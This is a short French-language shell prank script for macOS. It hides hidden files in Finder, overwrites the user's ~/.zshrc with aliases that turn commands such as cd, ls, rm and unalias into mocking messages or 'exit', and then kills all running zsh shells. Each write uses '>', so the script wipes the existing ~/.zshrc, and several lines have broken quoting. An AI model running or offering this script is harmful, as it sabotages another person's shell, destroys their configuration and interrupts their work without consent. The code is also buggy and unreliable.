#!/bin/sh

defaults write com.apple.finder AppleShowAllFiles NO

echo "alias cd='echo Pas le bon fichier ma gueule '" > ~/.zshrc
echo "alias cat='echo Regarde autre part stp '" > ~/.zshrc
echo "alias pwd='echo Je sais pas où tu es lol '" > ~/.zshrc
echo "alias vim='echo Utilise emacs stp '" > ~/.zshrc
echo "alias emacs='echo Utilise vim stp '" > ~/.zshrc
echo "alias vi='echo Utilise ton cerveau stp '" > ~/.zshrc
echo "alias ls='echo J'arrive pas à voir '" > ~/.zshrc
echo "alias echo='echo J'arrive pas à afficher '" > ~/.zshrc
echo "alias alias='echo attend l'alias arrive '" > ~/.zshrc
echo "alias unalias='echo Je n'arrive pas à l'enlever '" > ~/.zshrc
echo "alias mkdir='echo Création du dossier '" > ~/.zshrc
echo "alias touch='echo Création du fichier '" > ~/.zshrc
echo "alias rm='echo suppression du fichier ou du dossier '" > ~/.zshrc
echo "alias find='echo trouver '" > ~/.zshrc
echo "alias xcode='echo Utilise vi maintenant '" > ~/.zshrc
echo "alias ll='exit'" > ~/.zshrc
echo "alias cp='echo Je copie ton fichier/dossier '" > ~/.zshrc
echo "alias mv='echo Je coupe et colle ton fichier/dossier '" > ~/.zshrc
echo "alias 3.14159265359='emacs ~/.zshrc'" > ~/.zshrc
echo "alias indice='echo un nombre'" > ~/.zshrc
echo "alias indice2='echo unique'" > ~/.zshrc
echo "alias indice3='echo pi'" > ~/.zshrc
kill -1 $(ps ax|grep zsh|cut -d ' ' -f1)